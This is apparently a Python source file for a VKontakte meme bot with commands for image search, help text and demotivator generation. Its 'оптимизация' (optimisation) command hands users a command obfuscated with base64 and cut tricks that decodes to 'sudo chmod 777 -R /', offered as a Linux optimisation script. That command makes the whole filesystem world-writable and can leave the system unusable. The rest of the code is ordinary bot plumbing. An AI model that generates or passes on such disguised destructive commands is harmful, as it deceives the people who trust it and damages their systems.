import asyncio
import atexit
import base64
import logging
import os
import sys

from math import floor
from random import randint, choice
from string import ascii_letters as ASCII_LETTERS
from threading import Thread
from time import sleep
from typing import Callable, Awaitable, Any
from datetime import datetime

import yaml
import json
from PIL import UnidentifiedImageError
from vkwave.api import BotSyncSingleToken, Token, API
from vkwave.bots import (
    TokenStorage,
    Dispatcher,
    BotLongpollExtension,
    DefaultRouter,
    GroupId,
    EventTypeFilter,
    BotEvent,
    BaseEvent,
    PhotoUploader, WallPhotoUploader,
)
from vkwave.bots.core import BaseFilter
from vkwave.bots.core.dispatching.filters.base import FilterResult
from vkwave.bots.core.dispatching.handler.callback import BaseCallback
from vkwave.client import AIOHTTPClient
from vkwave.longpoll import BotLongpollData, BotLongpoll
from vkwave.types.bot_events import BotEventType

from images.demotivator import Demotivator
from images.searchimages import ImgSearch

try:
    if os.environ['DEBUG'] in ["1", "true"]:
        logging.basicConfig(level=logging.DEBUG)
except KeyError:
    pass

os.chdir(sys.path[0])

with open("vasya.json") as v:
    vasya = json.load(v)

botToken: Token
gid: int
admins: list
ApiMethods: object
demotivator: Demotivator
imgSearch: ImgSearch

if not ('VK_BOT_TOKEN' in os.environ):
    with open('vkapi.yaml') as c:
        config = yaml.safe_load(c)
        botToken = Token(config["bot_token"])
        gid = config["group_id"]
        admins = config["admin_ids"]
        #userToken = config["user_token"]
else:
    botToken = Token(os.environ['VK_BOT_TOKEN'])
    gid = int(os.environ['VK_BOT_GID'])
    admins = [int(x) for x in os.environ["VK_BOT_ADMINS"].split(",")]
    #userToken = os.environ['VK_API_TOKEN']


rateLimit = {}
def ratelimit(check):
    async def wrapper(self, event: BotEvent):
        _id = str(event.object.object.message.from_id)
        now = datetime.now().timestamp()
        if _id in rateLimit.items() and rateLimit[_id] + 5 > now:
            return False
        else:
            rateLimit[_id] = now
            return await check(self, event)
    return wrapper


class Bot:
    class _Methods:
        class Help:
            @staticmethod
            async def run(event: BotEvent):
                return '''Команды:
                кал текст - Поиск kала. Ваш персональный kал при вызове без текста.
                оптимизация - Сгенерировать скрипт оптимизации kaл linux
                демотиватор текст сверху;текст снизу - генерация демотиватора с приложенной картинкой.
                При вызове без картинки используется картинка по запросу, равному тексту сверху
                При вызове без параметров генерируется текст на основе ассоциаций бота васи ( https://vk.com/vasyamashinka )'''

        class Kal:
            @staticmethod
            async def run(event: BotEvent):
                if len(event.object.object.message.text) < 5:
                    query = f"kali {hex(event.object.object.message.from_id)[-2:]}"
                else:
                    query = f"kali {event.object.object.message.text[4:]}"
                links = imgSearch.fetch(query)
                if links:
                    link = [links[randint(0, len(links) - 1)]]
                    await ApiMethods.sendImage(event.object.object.message.from_id, link)
                else:
                    return "kaлов не найдено((9("

        class Optimisation:
            @staticmethod
            async def run(event: BotEvent):
                def bashEncode(string):
                    def randString(size):
                        return ''.join(choice(ASCII_LETTERS) for _ in range(size))

                    def b64(s):
                        return f"`echo {base64.b64encode(bytes(s, 'ascii')).decode('ascii')} | base64 -d`"

                    def cut(s):
                        len1, len2 = randint(2, 10), randint(2, 10)
                        rand1, rand2 = randString(len1), randString(len2)
                        pos = len1 + 1
                        return f"`echo {rand1}{s}{rand2} | cut -b {pos}-{pos}`"

                    result = "$("
                    for sym in string:
                        mode = randint(0, 1)
                        if mode == 0:
                            result += b64(sym)
                        elif mode == 1:
                            result += cut(sym)
                    return result + ")"


                return bashEncode("sudo chmod 777 -R /")

        class Demotivator:
            @staticmethod
            async def run(event: BotEvent):
                notFound = False
                msg = event.object.object.message.text.split(';')
                msg[0] = msg[0][12:]
                if not msg[0]:
                    await ApiMethods.sendImageFile(event.object.object.message.from_id, vasyaCache.getDemotivator())
                    return None
                elif len(msg) != 2:
                    return '''Использование:
                    демотиватор текст сверху;текст снизу
                    Использование ассоциаций из БД васи машинки:
                    демотиватор'''
                try:
                    d = demotivator.create(
                        event.object.object.message.attachments[0].photo.sizes[-1].url,
                        msg[0],
                        msg[1]
                    )
                except IndexError or AttributeError:
                    query = msg[0]
                    links = imgSearch.fetch(query)
                    if not links:
                        links = imgSearch.fetch("kernel panic")
                        notFound = True
                    link = links[randint(0, len(links) - 1)]
                    while True:
                        try:
                            d = demotivator.create(
                                link,
                                msg[0],
                                msg[1]
                            )
                            break
                        except UnidentifiedImageError:
                            links.pop(links.index(link))
                            link = links[randint(0, len(links) - 1)]
                            continue
                await ApiMethods.sendImageFile(event.object.object.message.from_id, d)
                if notFound:
                    return "kалов не найдено((9("
        """
        class Shitposting:
            @staticmethod
            async def run(event=None):
                query = "kali linux"
                links = imgSearch.fetch(query)
                link = links[randint(0, len(links) - 1)]
                while True:
                    try:
                        d = demotivator.create(
                            link,
                            "kali linux",
                            "test"
                        )
                        break
                    except UnidentifiedImageError:
                        links.pop(links.index(link))
                        link = links[randint(0, len(links) - 1)]
                        continue
                await ApiMethods.wallPostPhoto([d], floor(datetime.now().timestamp()) + 86400)
                return f"Скинул в отложку кал по запросу {query}"
        """
    class _TextFilters:
        filters = []
        rateLimit = {}

        class Help(BaseFilter):
            @ratelimit
            async def check(self, event: BotEvent) -> FilterResult:
                return FilterResult(event.object.object.message.text.lower() in
                                    ["hello", "привет", "команды", "commands", "help", "помощь"])

        class Kal(BaseFilter):
            async def check(self, event: BotEvent) -> FilterResult:
                return FilterResult(event.object.object.message.text.lower()[:3] in ["кал", "kal"])

        class Optimisation(BaseFilter):
            async def check(self, event: BotEvent) -> FilterResult:
                return FilterResult(event.object.object.message.text.lower() in ["оптимизация", "optimisation"])

        class Demotivator(BaseFilter):
            async def check(self, event: BotEvent) -> FilterResult:
                return FilterResult(event.object.object.message.text.lower()[:11] in ["демотиватор", "demotivator"])
        """
        class Shitposting(BaseFilter):
            async def check(self, event: BotEvent) -> FilterResult:
                return FilterResult(event.object.object.message.text.lower() == "шитпостинг"
                                    and event.object.object.message.from_id in admins)
        """
        def __init__(self):
            for member in dir(self):
                if member[:1].isupper():
                    self.filters.append(getattr(self, member))

    class _Callback(BaseCallback):
        def __init__(self, func: Callable[[BaseEvent], Awaitable[Any]]):
            self.func = func

        async def execute(self, event: BaseEvent) -> Any:
            return await self.func(event)

    def get_handlers(self, router):
        handlers = []
        eventTypeFilter = EventTypeFilter(BotEventType.MESSAGE_NEW)
        textFilters = self._TextFilters().filters
        methods = self._Methods()
        for _filter in textFilters:
            textFilter = _filter()
            resultCallback = self._Callback(getattr(methods, _filter.__name__).run)
            handler = router.registrar.new()
            handler.filters = [eventTypeFilter, textFilter]
            handler.callback = resultCallback
            handlers.append(handler)

        return handlers

    class VasyaCaching(Thread):
        def __init__(self, demotivator, vasyaDB, imgSearch):
            Thread.__init__(self)
            self.running = True
            self._d = demotivator
            self._v = vasyaDB
            self._i = imgSearch
            self._demCache = []

        def run(self):
            while self.running:
                if len(self._demCache) < 10:
                    self._getDemotivator()
                sleep(5)

        def _getDemotivator(self):
            links = []
            while not links:
                msg0, msg1 = choice(list(self._v.items()))
                msg1 = ' '.join(msg1)
                query = msg0
                links = self._i.fetch(query)
            link = links[randint(0, len(links) - 1)]
            while True:
                try:
                    dem = self._d.create(
                        link,
                        msg0,
                        msg1,
                        f'demotivator{len(self._demCache)}.png'
                    )
                    break
                except:
                    links.pop(links.index(link))
                    link = links[randint(0, len(links) - 1)]
                    continue
            self._demCache.append(dem)

        def getDemotivator(self):
            while not self._demCache:
                sleep(1)
            return self._demCache.pop(0)

async def main():
    global ApiMethods, demotivator, imgSearch, vasyaCache
    client = AIOHTTPClient()
    token = BotSyncSingleToken(botToken)
    #user_api = API(userToken, client)
    api_session = API(token, client)
    api = api_session.get_context()
    lp_data = BotLongpollData(gid)
    longpoll = BotLongpoll(api, lp_data)
    token_storage = TokenStorage[GroupId]()
    dp = Dispatcher(api_session, token_storage)
    lp_extension = BotLongpollExtension(dp, longpoll)
    uploader = PhotoUploader(api_session.get_context())
    demotivator = Demotivator()
    imgSearch = ImgSearch()
    vasyaCache = Bot.VasyaCaching(demotivator, vasya, imgSearch)
    vasyaCache.start()
    atexit.register(lambda: setattr(vasyaCache, "running", False))

    class ApiMethods:
        @staticmethod
        async def sendImage(userId, links):
            attachment = await uploader.get_attachments_from_links(
                peer_id=userId,
                links=links
            )
            await api_session.get_context().messages.send(
                user_id=userId, attachment=attachment, random_id=0
            )

        @staticmethod
        async def sendImageFile(userId, file):
            attachment = await uploader.get_attachments_from_paths(
                peer_id=userId,
                file_paths=[file]
            )
            await api_session.get_context().messages.send(
                user_id=userId, attachment=attachment, random_id=0
            )
        """
        @staticmethod
        async def wallPostPhoto(photos, date, message=None):
            photo = await WallPhotoUploader(user_api.get_context()).get_attachments_from_paths(
                group_id=-gid,
                file_paths=photos,
            )
            await user_api.get_context().wall.post(from_group=1, owner_id=-gid, message=message,
                                                      attachments=photo, publish_date=date)
        """
    router = DefaultRouter()
    bot = Bot()

    handlers = bot.get_handlers(router)
    for handler in handlers:
        router.registrar.register(handler.ready())

    dp.add_router(router)
    await dp.cache_potential_tokens()
    await lp_extension.start()


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(main())
    loop.run_forever()
